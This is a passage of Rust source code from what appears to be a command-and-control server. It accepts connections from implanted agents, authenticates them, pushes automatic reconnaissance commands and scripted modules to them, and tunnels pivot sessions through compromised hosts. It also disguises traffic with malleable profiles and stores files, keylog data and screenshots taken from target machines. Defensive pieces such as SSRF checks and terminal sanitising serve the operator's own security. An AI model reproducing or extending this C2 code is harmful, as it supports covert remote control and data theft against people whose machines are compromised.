// src/server/session.rs
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::{mpsc, oneshot};
use std::net::SocketAddr;
use std::sync::atomic::{Ordering, AtomicU32};
use ed25519_dalek::{SigningKey, Signer};
use chrono::{DateTime, Utc};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use std::collections::HashMap;
use std::pin::Pin;
use std::future::Future;
use tracing::{info, warn, error};

use rhai;
use crate::common::{ClientHello, Session, SecuredCommand, CommandResponse, SharedSessions, PivotFrame, MalleableProfile};
use crate::config::config;
use crate::database::{self, DbPool};
use crate::api::SharedResults;
use crate::rcm::{self, PackageManager, CollectedMeta, ScreenshotMeta, KeyCapture, KeyEvent};
use std::sync::Arc;
use crate::transport::{BoxedStream, C2Stream};

/// Build the SPEC §5.3 os-version fingerprint entry shared by
/// seed_rcm_fingerprint (at registration) and package_for_session (on the
/// first artifact, when the package is lazily created AFTER registration).
/// uid is ABSENT - insufficient data for the REQ-7.2 hash, which Table 1
/// permits during collection.
fn os_fingerprint_entry(hostname: &str, os: &str, computer_id: &str) -> rcm::fingerprint::FingerprintEntry {
    rcm::fingerprint::FingerprintEntry {
        target: "machine".into(),
        fp_type: "os".into(),
        version: 1,
        uid: None,
        fields: vec![
            ("hostname".into(), hostname.to_string()),
            ("osversion".into(), os.to_string()),
            ("usertag".into(), "NONE".into()),
            ("private_rcm_computerid".into(), computer_id.to_string()),
        ],
    }
}

/// Upsert a fingerprint entry into a package (non-fatal): conflicts are
/// surfaced as operator-visible warnings (REQ-7.6.3/16.1), errors logged.
fn upsert_fingerprint_entry(pkg: &PackageManager, hostname: &str, entry: rcm::fingerprint::FingerprintEntry) {
    match pkg.update_fingerprint(&entry) {
        Ok(rcm::UpsertOutcome::ConflictKept(keys)) => {
            warn!("RCM fingerprint conflict for {}: existing value kept for key(s): {}",
                hostname, keys.join(", "));
        }
        Ok(_) => {}
        Err(e) => warn!("RCM fingerprint seed failed for {}: {}", hostname, e),
    }
}

/// Resolve the RCM package for a session via the sessions DB table.
///
/// With lazy packages, registration usually precedes package creation, so
/// seed_rcm_fingerprint no-ops and the lazily-created package's fingerprint
/// would otherwise lack `osversion` until the next re-registration. After
/// resolving (or creating) the package here, upsert the os-version
/// enrichment entry. The upsert is idempotent (NoChange when identical),
/// so the per-artifact cost is one XML read.
fn package_for_session(db: &DbPool, sess_id: u32) -> Option<Arc<PackageManager>> {
    let conn = db.get().ok()?;
    let (hostname, computer_id, os) = conn.query_row(
        "SELECT hostname, computer_id, os FROM sessions WHERE id = ?1",
        rusqlite::params![sess_id],
        |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?, r.get::<_, String>(2)?))
    ).ok()?;
    let pkg = rcm::registry().for_target(&hostname, &computer_id).ok()?;
    if !os.is_empty() {
        upsert_fingerprint_entry(&pkg, &hostname, os_fingerprint_entry(&hostname, &os, &computer_id));
    }
    Some(pkg)
}

/// Parse a keylog-entry timestamp into UTC. Entries may carry an ISO-8601
/// string or a Unix epoch as int/float; anything unparseable yields None
/// (callers fall back to capture-time now).
fn rcm_entry_ts(v: &serde_json::Value) -> Option<DateTime<Utc>> {
    use chrono::TimeZone;
    if let Some(s) = v.as_str() {
        if let Ok(dt) = DateTime::parse_from_rfc3339(s) {
            return Some(dt.with_timezone(&Utc));
        }
        if let Ok(ndt) = chrono::NaiveDateTime::parse_from_str(s, "%Y-%m-%dT%H:%M:%S%.f") {
            return Some(Utc.from_utc_datetime(&ndt));
        }
        None
    } else if let Some(n) = v.as_i64() {
        Utc.timestamp_opt(n, 0).single()
    } else if let Some(f) = v.as_f64() {
        Utc.timestamp_opt(f as i64, 0).single()
    } else {
        None
    }
}

/// Build a ScreenshotMeta with only the fields we actually know populated;
/// every other optional key is None (rendered as NONE in the sidecar).
fn rcm_screenshot_meta(captured_at: DateTime<Utc>, toolspecific: String, monitor: Option<String>) -> ScreenshotMeta {
    ScreenshotMeta {
        captured_at,
        toolspecific,
        ext: "png".to_string(),
        originalsize: None,
        isfullscreen: None,
        isminimized: None,
        activewindow: None,
        pid: None,
        imagename: None,
        windowtitle: None,
        session: None,
        user: None,
        monitor,
    }
}

/// Look up the RCM package for a target WITHOUT creating one. Registration
/// uses this so that mere check-ins (including unauthenticated legacy builds)
/// cannot mint on-disk package trees - packages are created lazily on the
/// first real artifact (package_for_session -> registry().for_target creates).
/// The screenshot-listing API route uses it for the same reason: a GET must
/// never mint package dirs, and the `.rcmtarget` marker compare prevents
/// hostname-collision misattribution.
///
/// NOTE: rcm::registry::get_if_exists does not exist yet, so this mirrors
/// registry::for_target's key derivation and PackageManager::create_or_open's
/// root-name candidate loop exactly, but STOPS at the first missing candidate
/// instead of creating it, and opens the match via by_root_name (which never
/// creates). Keep in sync with src/rcm/{registry,package}.rs.
pub(crate) fn package_if_exists(hostname: &str, computer_id: &str) -> Option<Arc<PackageManager>> {
    let reg = rcm::registry();
    // Key derivation identical to registry::for_target (it doubles as the
    // instance id written into .rcmtarget).
    let key: &str = if !computer_id.is_empty() {
        computer_id
    } else if !hostname.is_empty() {
        hostname
    } else {
        "unknown-target"
    };
    // Root-name derivation identical to PackageManager::create_or_open.
    let mut name = rcm::paths::sanitize_root_name(hostname);
    if name.is_empty() {
        name = rcm::paths::sanitize_component(key);
    }
    if name.is_empty() {
        name = "unknown-target".to_string();
    }

    let base = reg.base().to_path_buf();
    let mut n = 0u64;
    loop {
        let cand = if n == 0 { name.clone() } else { format!("{}.{}", name, n) };
        let root = base.join(&cand);
        match root.symlink_metadata() {
            Ok(md) => {
                // Symlink/foreign entry: same skip rule as create_or_open.
                if md.file_type().is_symlink() || !md.is_dir() {
                    n += 1;
                } else {
                    let marker =
                        std::fs::read_to_string(root.join(".rcmtarget")).unwrap_or_default();
                    if marker.trim() == key {
                        // Existing package for this target - open (no create).
                        return reg.by_root_name(&cand).ok();
                    }
                    n += 1; // folder belongs to a different target
                }
            }
            // First missing candidate: create_or_open would CREATE here.
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return None,
            Err(_) => return None,
        }
        if n > 1024 {
            // Pathological collision-storm guard.
            return None;
        }
    }
}

/// Seed the RCM package fingerprint for a freshly registered target
/// (SPEC §5.3). uid is ABSENT - insufficient data for the REQ-7.2 hash,
/// which Table 1 permits during collection. Non-fatal: errors are logged.
///
/// Lazy packages: the fingerprint is only enriched when a package ALREADY
/// exists on disk; registration itself must never create one.
pub(crate) fn seed_rcm_fingerprint(hostname: &str, computer_id: &str, os: &str) {
    let (hostname, computer_id, os) =
        (hostname.to_string(), computer_id.to_string(), os.to_string());
    tokio::task::spawn_blocking(move || {
        match package_if_exists(&hostname, &computer_id) {
            Some(pkg) => {
                upsert_fingerprint_entry(&pkg, &hostname,
                    os_fingerprint_entry(&hostname, &os, &computer_id));
            }
            // No package on disk yet - it will be created (and seeded) on the
            // first collected artifact; nothing to enrich at registration.
            None => {}
        }
    });
}

/// Check if a host string is in the private 172.16.0.0/12 range (172.16-31.x.x).
/// The old `starts_with("172.")` incorrectly blocked public IPs like Google's
/// 172.217.x.x range.
fn is_private_172(host: &str) -> bool {
    if !host.starts_with("172.") { return false; }
    // Parse the second octet
    let rest = &host[4..];
    if let Some(dot_pos) = rest.find('.') {
        if let Ok(second_octet) = rest[..dot_pos].parse::<u8>() {
            return (16..=31).contains(&second_octet); // 172.16.0.0/12
        }
    }
    false
}

/// Strip ANSI escape sequences and dangerous control characters from agent
/// output before printing to the server operator's terminal.
///
/// Without this, a hijacked agent (or a defender who compromised an endpoint)
/// can return malicious ANSI sequences that clear the screen, spoof fake
/// command results, inject terminal commands via OSC sequences, or hide
/// their activity from the operator.
fn sanitize_terminal_output(s: &str) -> String {
    let mut result = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\x1B' {
            // Skip ESC + everything up to the terminating letter.
            // CSI sequences: ESC [ ... <letter>
            // OSC sequences: ESC ] ... <ST or BEL>
            if let Some(&next) = chars.peek() {
                if next == '[' {
                    chars.next(); // consume '['
                    // Consume until we hit a letter (0x40..0x7E)
                    while let Some(&p) = chars.peek() {
                        chars.next();
                        if p.is_ascii_alphabetic() || p == '@' || p == '~' { break; }
                    }
                } else if next == ']' {
                    chars.next(); // consume ']'
                    // OSC: consume until BEL (0x07) or ST (ESC \)
                    while let Some(&p) = chars.peek() {
                        chars.next();
                        if p == '\x07' { break; }
                        if p == '\x1B' {
                            if chars.peek() == Some(&'\\') { chars.next(); }
                            break;
                        }
                    }
                } else {
                    chars.next(); // skip single-char escape
                }
            }
        } else if c.is_control() && c != '\n' && c != '\r' && c != '\t' {
            // Strip other control characters (BEL, BS, etc.)
            continue;
        } else {
            result.push(c);
        }
    }
    result
}
use crate::traffic::DataMolder;

/// Allocate session IDs from the database to survive server restarts.
fn next_session_id(db: &DbPool) -> u32 {
    // Fallback IDs start high so they never collide with DB-allocated ids.
    // The seed comes from typed config (0 = not yet seeded; the DB path is
    // the norm and the fallback only fires when the DB is unreachable).
    static FALLBACK_ID: AtomicU32 = AtomicU32::new(0);
    if let Ok(conn) = db.get() {
        if let Ok(id) = database::allocate_session_id(&conn) {
            return id;
        }
    }
    if FALLBACK_ID.load(Ordering::Relaxed) == 0 {
        FALLBACK_ID.store(
            crate::config::config().server.session_fallback_id_start,
            Ordering::Relaxed,
        );
    }
    FALLBACK_ID.fetch_add(1, Ordering::Relaxed)
}

pub fn handle_connection(
    stream: BoxedStream,
    addr: SocketAddr,
    sessions: SharedSessions,
    db: DbPool,
    results: SharedResults,
    parent_id: Option<u32>
) -> Pin<Box<dyn Future<Output = ()> + Send>> {
    Box::pin(async move {
        let (mut reader, mut writer) = tokio::io::split(stream);
        let mut virtual_sessions: HashMap<u32, mpsc::UnboundedSender<Vec<u8>>> = HashMap::new();

        // 1. Handshake: Detect Profile & Read Hello
        // Timeout the initial read to prevent Slowloris-style attacks where an
        // attacker opens connections and sends no data, permanently holding
        // semaphore slots and blocking all legitimate agents from connecting.
        let handshake_result = tokio::time::timeout(
            std::time::Duration::from_secs(30),
            DataMolder::detect_and_recv(&mut reader)
        ).await;

        let (hello_buf, _) = match handshake_result {
            Ok(Ok(res)) => res,
            Ok(Err(e)) => {
                if e.kind() != std::io::ErrorKind::UnexpectedEof {
                    warn!("Handshake/Detection Error from {}: {}", addr, e);
                }
                return;
            }
            Err(_) => {
                warn!("Handshake timeout from {} (30s)", addr);
                return;
            }
        };
        
        let hello: ClientHello = match serde_json::from_slice(&hello_buf) {
            Ok(h) => h,
            Err(e) => { error!("JSON Error from {}: {}", addr, e); return; }
        };

        // 2. Authentication & Profile Loading
        let (signing_key, active_profile, profile_name, challenge_key_opt) = {
            let conn = match db.get() {
                Ok(c) => c,
                Err(e) => { error!("DB Connection Failed: {}", e); return; }
            };
            
            match database::get_build_info(&conn, &hello.build_id) {
                Some((key_bytes, name, profile_json_opt, ck)) => {
                    let key = match key_bytes.try_into() {
                        Ok(a) => SigningKey::from_bytes(&a),
                        Err(_) => { error!("Invalid Key in DB for {}", hello.build_id); return; }
                    };

                    let profile = if let Some(json) = profile_json_opt {
                        serde_json::from_str::<MalleableProfile>(&json).unwrap_or_else(|e| {
                            warn!(
                                "Stored profile for build {} does not parse as positional MalleableProfile ({}); \
                                 pre-upgrade object-format profiles must be converted - using default profile",
                                hello.build_id, e
                            );
                            MalleableProfile::default()
                        })
                    } else {
                        MalleableProfile::default()
                    };

                    (key, profile, name, ck)
                },
                None => { warn!("Unknown Build ID from {}: {}", addr, hello.build_id); return; },
            }
        };

        // 2b. Challenge-Response Authentication
        // If the build has a challenge_key, require the agent to prove knowledge of it.
        if let Some(ref ck_bytes) = challenge_key_opt {
            use hmac::{Hmac, Mac};
            use sha2::Sha256;
            type HmacSha256 = Hmac<Sha256>;

            // Generate random 32-byte nonce
            let mut nonce_bytes = [0u8; 32];
            rand::RngCore::fill_bytes(&mut rand::rngs::OsRng, &mut nonce_bytes);
            let nonce_hex = hex::encode(&nonce_bytes);

            // Sign the nonce with the build's ed25519 key (proves server identity)
            let server_sig = signing_key.sign(nonce_hex.as_bytes());
            let server_proof = BASE64.encode(server_sig.to_bytes());

            let challenge = crate::common::HandshakeChallenge {
                nonce: nonce_hex.clone(),
                server_proof,
            };

            // Send challenge
            if let Ok(challenge_data) = serde_json::to_vec(&challenge) {
                let handshake_profile = MalleableProfile::default();
                if DataMolder::send(&mut writer, &challenge_data, &handshake_profile).await.is_err() {
                    warn!("Failed to send challenge to {}", addr);
                    return;
                }
            }

            // Read agent's HMAC response
            let resp_buf = match DataMolder::recv(&mut reader, &MalleableProfile::default()).await {
                Ok(b) => b,
                Err(_) => { warn!("No challenge response from {}", addr); return; }
            };

            let resp: crate::common::HandshakeResponse = match serde_json::from_slice(&resp_buf) {
                Ok(r) => r,
                Err(_) => { warn!("Invalid challenge response from {}", addr); return; }
            };

            // Verify HMAC: HMAC-SHA256(challenge_key, nonce || build_id)
            let mut mac = match <HmacSha256 as Mac>::new_from_slice(ck_bytes) {
                Ok(m) => m,
                Err(_) => { error!("Invalid challenge key length for {}", hello.build_id); return; }
            };
            mac.update(nonce_hex.as_bytes());
            mac.update(hello.build_id.as_bytes());

            // Decode the received HMAC from base64, then use verify_slice which
            // does a constant-time comparison internally and returns Err on any
            // mismatch - including length differences - without panicking.
            let received_raw = match BASE64.decode(resp.hmac.as_bytes()) {
                Ok(b) => b,
                Err(_) => {
                    warn!("Malformed HMAC base64 from {} for {}", addr, hello.build_id);
                    return;
                }
            };
            if mac.verify_slice(&received_raw).is_err() {
                warn!("Challenge-response FAILED for {} from {}", hello.build_id, addr);
                return;
            }

            info!("Challenge-response verified for {} from {}", hello.build_id, addr);
        }

        // 3. Register Session
        let sess_id = next_session_id(&db);
        {
            if let Ok(conn) = db.get() {
                database::log_new_session(
                    &conn, &hello.exe_id, &hello.computer_id, &hello.hostname, &hello.os,
                    &addr.ip().to_string(), &hello.build_id, &profile_name
                );
            }
        }

        // Seed the RCM fingerprint for this target (SPEC §5.3) - non-fatal.
        seed_rcm_fingerprint(&hello.hostname, &hello.computer_id, &hello.os);
        
        let conn_type = if let Some(pid) = parent_id { format!("Tunneled via #{}", pid) } else { "Direct".to_string() };
        
        info!(session_id = sess_id, ip = %addr.ip(), profile = %profile_name, "Session Established");
        println!("\n[+] New Session {}: {} ({}) [{}] via {}", sess_id, addr.ip(), hello.build_id, conn_type, profile_name);

        // Fire webhook notification for new session
        {
            let db_wh = db.clone();
            let hostname = hello.hostname.clone();
            let ip = addr.ip().to_string();
            let os = hello.os.clone();
            tokio::spawn(async move {
                if let Ok(conn) = db_wh.get() {
                    if let Some(webhook_url) = database::get_webhook_url(&conn) {
                        // SSRF protection: validate that the webhook URL doesn't
                        // target internal/private addresses. A compromised or
                        // malicious operator could change the webhook to scan the
                        // C2 server's internal network or hit cloud metadata endpoints.
                        if let Ok(url) = url::Url::parse(&webhook_url) {
                            if let Some(host) = url.host_str() {
                                // Phase 1: hostname string check (catches obvious cases)
                                let is_suspicious = host == "localhost"
                                    || host.ends_with(".internal")
                                    || host.ends_with(".local")
                                    || host == "metadata.google.internal";
                                if is_suspicious {
                                    warn!("Blocked SSRF webhook to suspicious host: {}", webhook_url);
                                    return;
                                }

                                // Phase 2: DNS resolution check. Resolves the hostname
                                // and validates every resolved IP against private ranges.
                                // This catches DNS rebinding (attacker.com -> 127.0.0.1),
                                // alt IP encodings (0x7f000001, 2130706433), and IPv6
                                // mapped IPv4 (::ffff:127.0.0.1) that bypass string checks.
                                //
                                // To prevent TOCTOU / DNS rebinding, we pin the reqwest
                                // client to the validated IP via .resolve() so the HTTP
                                // connection uses exactly the address we checked.
                                let port = url.port().unwrap_or(if url.scheme() == "https" { 443 } else { 80 });
                                let lookup_host = format!("{}:{}", host, port);
                                let validated_addr = match tokio::net::lookup_host(&lookup_host).await {
                                    Ok(addrs) => {
                                        let mut first_valid: Option<std::net::SocketAddr> = None;
                                        for addr in addrs {
                                            let ip = addr.ip();
                                            let is_private_ip = match ip {
                                                std::net::IpAddr::V4(v4) => {
                                                    v4.is_loopback()
                                                    || v4.is_private()
                                                    || v4.is_link_local()
                                                    || v4.is_broadcast()
                                                    || v4.is_unspecified()
                                                    || v4.octets()[0] == 169 && v4.octets()[1] == 254 // link-local
                                                }
                                                std::net::IpAddr::V6(v6) => {
                                                    v6.is_loopback()
                                                    || v6.is_unspecified()
                                                    // Check for IPv6-mapped IPv4 private addresses
                                                    || v6.to_ipv4_mapped().map(|v4| {
                                                        v4.is_loopback() || v4.is_private() || v4.is_link_local()
                                                    }).unwrap_or(false)
                                                }
                                            };
                                            if is_private_ip {
                                                warn!("Blocked SSRF webhook: {} resolves to private IP {}", webhook_url, ip);
                                                return;
                                            }
                                            if first_valid.is_none() {
                                                first_valid = Some(addr);
                                            }
                                        }
                                        match first_valid {
                                            Some(addr) => addr,
                                            None => { warn!("Webhook DNS returned no addresses for {}", host); return; }
                                        }
                                    }
                                    Err(e) => {
                                        warn!("Webhook DNS resolution failed for {}: {}", host, e);
                                        return;
                                    }
                                };

                                // Pin the HTTP client to the validated IP address.
                                // reqwest::resolve() overrides DNS for the given host,
                                // so even if the domain's DNS changes between our check
                                // and the TCP connect, we use the address we validated.
                                let host_owned = host.to_string();
                                let client = match reqwest::Client::builder()
                                    .resolve(&host_owned, validated_addr)
                                    .timeout(std::time::Duration::from_secs(5))
                                    .build()
                                {
                                    Ok(c) => c,
                                    Err(e) => {
                                        warn!("Failed to build webhook client: {}", e);
                                        return;
                                    }
                                };

                                let payload = serde_json::json!({
                                    "event": "new_session",
                                    "session_id": sess_id,
                                    "hostname": hostname,
                                    "ip": ip,
                                    "os": os,
                                    "text": format!("New session #{}: {} ({}) [{}]", sess_id, hostname, ip, os),
                                });
                                let _ = client
                                    .post(&webhook_url)
                                    .json(&payload)
                                    .send()
                                    .await;
                            }  // if let Some(host)
                        }  // if let Ok(url)
                    }  // if let Some(webhook_url)
                }  // if let Ok(conn)
            });
        }

        // Command channel: unbounded because callers span many async contexts.
        // Backpressure is applied at the HTTP layer via MAX_QUEUED_COMMANDS.
        let (tx, mut rx) = mpsc::unbounded_channel::<(String, Option<oneshot::Sender<u64>>)>();
        // Data channel: bounded to prevent OOM from slow consumers or
        // Slowloris-style attacks that trickle data while the server pushes.
        let (v_tx, mut v_rx) = mpsc::channel::<(u32, Vec<u8>)>(64);
        
        let last_seen = std::sync::Arc::new(std::sync::atomic::AtomicI64::new(chrono::Utc::now().timestamp()));
        
        let tx_recon = tx.clone(); // Clone before move into Session
        
        sessions.insert(sess_id, Session {
            id: sess_id, computer_id: hello.computer_id, addr, hostname: hello.hostname,
            os: hello.os, tx, signing_key: signing_key.clone(), parent_id,
            last_seen: last_seen.clone(),
            interfaces: hello.interfaces.clone(),
            hibernation_mode: hello.hibernation_mode,
        });

        // 3b. Auto-recon: fire saved commands on new session
        {
            let db_recon = db.clone();
            tokio::spawn(async move {
                // Small delay so the agent's command loop is ready
                tokio::time::sleep(std::time::Duration::from_millis(500)).await;
                if let Ok(conn) = db_recon.get() {
                    let commands = database::get_auto_recon(&conn);
                    for cmd in commands {
                        if let Some(module_name) = cmd.strip_prefix("module:") {
                            // Run a server-side Rhai module, wiring send_c2_command
                            // to tx_recon so the module's commands reach this session.
                            let tx_mod  = tx_recon.clone();
                            let mod_path = format!("./modules/{}.rhai", module_name.trim());
                            let mod_sess = sess_id;
                            if let Ok(script) = std::fs::read_to_string(&mod_path) {
                                let _ = tokio::task::spawn_blocking(move || {
                                    let mut engine = rhai::Engine::new();
                                    engine.register_fn("send_c2_command",
                                        move |_sid: i64, cmd: &str| {
                                            let _ = tx_mod.send((cmd.to_string(), None));
                                            "Queued".to_string()
                                        }
                                    );
                                    engine.register_fn("print", |s: &str| {
                                        tracing::debug!("module: {}", s);
                                    });
                                    if let Ok(ast) = engine.compile(&script) {
                                        let mut scope = rhai::Scope::new();
                                        let _: Result<rhai::Dynamic, _> = engine
                                            .call_fn(&mut scope, &ast, "run",
                                                     (mod_sess as i64,));
                                    }
                                }).await;
                            } else {
                                warn!(sess_id, module = %module_name,
                                      "Auto-recon module not found");
                            }
                        } else {
                            // Regular command or ext:load - send directly to agent
                            let _ = tx_recon.send((cmd, None));
                        }
                        // Stagger entries slightly
                        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
                    }
                }
            });
        }

        let mut counter = 1u64;

        // 4. Main Loop
        loop {
            tokio::select! {
                // A. Send Command
                Some((cmd_txt, callback)) = rx.recv() => {
                    let mut cmd = SecuredCommand {
                        session_id: "sess".to_string(), counter, nonce: rand::random(),
                        timestamp: Utc::now(), command: cmd_txt.clone(), signature: String::new()
                    };
                    
                    let log_txt = cmd_txt.clone();
                    let db_inner = db.clone();
                    tokio::task::spawn_blocking(move || {
                        match db_inner.get() {
                            Ok(conn) => database::log_command(&conn, sess_id, counter, &log_txt),
                            Err(e) => error!(session_id = sess_id, error = %e, "Failed to log command"),
                        }
                    });

                    info!(session_id = sess_id, req_id = counter, "Sending Command");

                    let sig = signing_key.sign(&cmd.get_signable_bytes());
                    cmd.signature = BASE64.encode(sig.to_bytes());
                    
                    let j = match serde_json::to_vec(&cmd) {
                        Ok(data) => data,
                        Err(e) => {
                            error!("Serialization failure for session {}: {}", sess_id, e);
                            continue;
                        }
                    };
                    
                    if DataMolder::send(&mut writer, &j, &active_profile).await.is_err() { break; }
                    
                    if let Some(cb) = callback { let _ = cb.send(counter); }
                    counter += 1;
                }

                // B. Receive Data
                res = DataMolder::recv(&mut reader, &active_profile) => {
                    match res {
                        Ok(b) => {
                            // Update heartbeat timestamp
                            last_seen.store(chrono::Utc::now().timestamp(), std::sync::atomic::Ordering::Relaxed);
                            if let Ok(frame) = serde_json::from_slice::<PivotFrame>(&b) {
                                let child_id = frame.source;
                                if let Some(v_sender) = virtual_sessions.get(&child_id) {
                                    if !frame.data.is_empty() { let _ = v_sender.send(frame.data); }
                                } else {
                                    // New Pivot Logic - cap to prevent resource exhaustion
                                    // from a compromised agent flooding with fake child_ids.
                                    let max_virtual = config().server.max_virtual_sessions;
                                    if virtual_sessions.len() >= max_virtual {
                                        warn!(parent = sess_id, "Pivot limit reached ({}), ignoring child {}", max_virtual, child_id);
                                        continue;
                                    }

                                    let mut real_addr = addr;
                                    if !frame.metadata.is_empty() {
                                        if let Ok(parsed_ip) = frame.metadata.parse::<SocketAddr>() { real_addr = parsed_ip; }
                                    }
                                    info!(parent = sess_id, child = child_id, "New Pivot");
                                    println!("[+] New Pivot: Child #{} via #{}", child_id, sess_id);
                                    
                                    let (server_half, bridge_half) = tokio::io::duplex(4096);
                                    let (child_tx, mut child_rx) = mpsc::unbounded_channel::<Vec<u8>>();
                                    virtual_sessions.insert(child_id, child_tx.clone());
                                    
                                    if !frame.data.is_empty() { let _ = child_tx.send(frame.data); }
                                    let v_tx_clone = v_tx.clone();
                                    
                                    tokio::spawn(async move {
                                        let (mut b_read, mut b_write) = tokio::io::split(bridge_half);
                                        let mut buf = [0u8; 4096];
                                        loop {
                                            tokio::select! {
                                                n = b_read.read(&mut buf) => match n {
                                                    Ok(n) if n > 0 => { let _ = v_tx_clone.send((child_id, buf[..n].to_vec())).await; },
                                                    _ => break,
                                                },
                                                Some(d) = child_rx.recv() => { if b_write.write_all(&d).await.is_err() { break; } }
                                            }
                                        }
                                    });

                                    let (s_c, d_c, r_c) = (sessions.clone(), db.clone(), results.clone());
                                    tokio::spawn(async move {
                                        handle_connection(C2Stream::Virtual(server_half), real_addr, s_c, d_c, r_c, Some(sess_id)).await;
                                    });
                                }
                                continue;
                            }
                            if let Ok(r) = serde_json::from_slice::<CommandResponse>(&b) {
                                process_response(sess_id, r, &results, &db).await;
                            }
                        }
                        Err(_) => break,
                    }
                }
                
                // C. Pivot Write
                Some((target, data)) = v_rx.recv() => {
                    let frame = PivotFrame { stream_id: 0, destination: target, source: 0, data, metadata: String::new() };
                    if let Ok(j) = serde_json::to_vec(&frame) {
                        if DataMolder::send(&mut writer, &j, &active_profile).await.is_err() { break; }
                    }
                }
            }
        }
        sessions.remove(&sess_id);
        info!(session_id = sess_id, "Session Disconnected");
        println!("\n[-] Session {} disconnected.", sess_id);
    })
}

/// Known `file:` wire-message prefixes (SPEC §4). A line that starts with
/// one of these is a protocol message; anything else in a multi-line
/// response is plain command output that must fall through to the normal
/// output path (results map + DB + println) rather than vanish.
const WIRE_PREFIXES: [&str; 5] = [
    "file:meta|",
    "file:data_batch|",
    "file:data|",
    "file:chunk|",
    "file:report_batch|",
];

/// Partition a multi-line response into known `file:` wire messages and
/// plain output lines, preserving order within each class.
fn partition_wire_lines(output: &str) -> (Vec<String>, Vec<&str>) {
    let mut wire = Vec::new();
    let mut plain = Vec::new();
    for line in output.lines() {
        if WIRE_PREFIXES.iter().any(|p| line.starts_with(p)) {
            wire.push(line.to_string());
        } else {
            plain.push(line);
        }
    }
    (wire, plain)
}

/// Log a malformed `file:` wire line: to the package log when the session's
/// package is resolvable, else to tracing. Malformed wire lines must never
/// be silently dropped (framing-injection hardening).
fn log_wire_malformed(sess_id: u32, pkg: Option<&Arc<PackageManager>>, msg: &str) {
    match pkg {
        Some(p) => {
            let _ = p.log("agent", "ERROR", msg);
        }
        None => warn!(sess_id, "{}", msg),
    }
}

/// Handle one line of the `file:` wire family (SPEC §4). `pkg` is the
/// session's RCM package, resolved ONCE per response by the caller (None
/// when the session row/package is unavailable); all storage goes through
/// it and progress/failure messages go to the package log (Sec 13).
/// `transfer_id` identifies the owning command (its request id) so chunked
/// transfers of the same path never mix their .part slots.
fn handle_file_line(
    sess_id: u32,
    line: &str,
    pkg: Option<&Arc<PackageManager>>,
    transfer_id: &str,
) {
    use rcm::custody::CustodyAction;

    // file:meta|<batch_ts>|<rel>|<abs>|<json_b64> - optional metadata
    // announcement sent BEFORE the file data it describes.
    if let Some(rest) = line.strip_prefix("file:meta|") {
        let parts: Vec<&str> = rest.splitn(4, '|').collect();
        if parts.len() != 4 {
            log_wire_malformed(sess_id, pkg,
                &format!("malformed file:meta line ({} of 4 fields after prefix)", parts.len()));
            return;
        }
        let (batch_ts, rel, abs, json_b64) = (parts[0], parts[1], parts[2], parts[3]);
        let parsed = BASE64.decode(json_b64).ok()
            .and_then(|b| serde_json::from_slice::<serde_json::Value>(&b).ok());
        match (pkg, parsed) {
            (Some(pkg), Some(j)) => {
                let get = |k: &str| j.get(k).and_then(|v| v.as_str()).map(|s| s.to_string());
                // RFC3339 UTC strings pass through as canonical (they are
                // already UTC ISO); accept as-is.
                let meta = CollectedMeta {
                    modified: get("modified"),
                    accessed: get("accessed"),
                    created:  get("created"),
                    owner:    get("owner"),
                    group:    get("group"),
                };
                pkg.note_file_meta(batch_ts, rel, abs, meta);
            }
            (Some(pkg), None) => {
                let _ = pkg.log("agent", "ERROR",
                    &format!("malformed file:meta payload for {} (b64/json decode failed)", rel));
            }
            (None, _) => {
                warn!(sess_id, "No RCM package for session; dropping file:meta");
            }
        }
        return;
    }

    // file:data_batch|<batch>|<root>|<rel>|<perms>|<b64> - legacy batch
    // message (current agents no longer send it); kept working.
    if line.starts_with("file:data_batch|") {
        let parts: Vec<&str> = line.splitn(6, '|').collect();
        if parts.len() != 6 {
            log_wire_malformed(sess_id, pkg,
                &format!("malformed file:data_batch line ({} of 6 fields)", parts.len()));
            return;
        }
        let (batch, root, rel, b64) = (parts[1], parts[2], parts[3], parts[5]);
        let Some(pkg) = pkg else {
            error!(sess_id, file = rel, "No RCM package for session; dropping file:data_batch");
            return;
        };
        let (abs, meta) = pkg.take_file_meta(batch, rel)
            .unwrap_or_else(|| (rel.to_string(), CollectedMeta::default()));
        match BASE64.decode(b64) {
            Ok(bytes) => match pkg.store_collected(&abs, &bytes, &meta) {
                Ok(stored) => {
                    let _ = pkg.custody("rcm-server", CustodyAction::Collect,
                        None, Some(&format!("Collected {}", abs)));
                    let _ = pkg.log("agent", "INFO",
                        &format!("Downloaded: {} (batch {} root {}) -> {}", rel, batch, root, stored));
                }
                Err(e) => {
                    let _ = pkg.log("agent", "ERROR", &format!("FAILED: {} - {}", rel, e));
                }
            },
            Err(e) => {
                let _ = pkg.log("agent", "ERROR", &format!("FAILED: {} - b64 decode: {}", rel, e));
            }
        }
        return;
    }

    // file:data|<path>|<perms>|<b64> - single-file download.
    if line.starts_with("file:data|") {
        let parts: Vec<&str> = line.splitn(4, '|').collect();
        if parts.len() != 4 {
            log_wire_malformed(sess_id, pkg,
                &format!("malformed file:data line ({} of 4 fields)", parts.len()));
            return;
        }
        let (path, b64) = (parts[1], parts[3]);
        let Some(pkg) = pkg else {
            error!(sess_id, file = path, "No RCM package for session; dropping file:data");
            return;
        };
        let (abs, meta) = pkg.take_file_meta("-", path)
            .unwrap_or_else(|| (path.to_string(), CollectedMeta::default()));
        match BASE64.decode(b64) {
            Ok(bytes) => match pkg.store_collected(&abs, &bytes, &meta) {
                Ok(stored) => {
                    let _ = pkg.custody("rcm-server", CustodyAction::Collect,
                        None, Some(&format!("Collected {}", abs)));
                    let _ = pkg.log("agent", "INFO",
                        &format!("collected {} -> {}", abs, stored));
                    info!(sess_id, file = path, "File Downloaded Successfully");
                    // `stored` is already package-relative
                    // ("downloads/C/..."); prefix the root name once.
                    println!("\n[+] Single Download: {}/{}", pkg.root_name(), stored);
                }
                Err(e) => {
                    let _ = pkg.log("agent", "ERROR",
                        &format!("store failed for {}: {}", abs, e));
                    error!(sess_id, file = path, error = %e, "File Download Failed");
                    println!("\n[-] Save Error: {}", e);
                }
            },
            Err(e) => {
                let _ = pkg.log("agent", "ERROR",
                    &format!("b64 decode failed for {}: {}", path, e));
                error!(sess_id, file = path, error = %e, "File Download Failed");
